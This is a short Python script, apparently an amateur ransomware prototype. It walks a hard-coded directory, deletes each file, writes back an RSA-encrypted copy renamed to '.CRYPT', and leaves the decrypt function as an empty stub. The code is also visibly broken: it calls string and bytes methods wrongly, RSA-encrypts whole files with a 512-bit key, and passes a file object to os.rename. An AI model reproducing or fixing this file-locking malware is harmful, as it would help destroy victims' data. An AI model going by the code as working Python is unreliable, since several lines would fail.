import os
import sys
import rsa

PATH = 'R://Games//X'
(CryptKey, DecryptKey) = rsa.newkeys(512)
files = os.listdir(PATH)
my_name = sys.argv[0]

def encrypt():
    for file in files:
        file_name = str(file)
        #if file != my_name:
        file_data = open(file, 'rb')
        data = file_data.read()
        file_data.close()
        file.remove()

        new_file = open(file_name, 'wb')
        data = data.encode('utf8')
        data = rsa.encrypt(data, CryptKey)
        new_file.write(data)
        new_file.close()

        os.rename(new_file, file_name.split('.')[0] + '.CRYPT')

        #else:
        #    pass

def decrypt():
    pass

if __name__ == '__main__':
    encrypt()
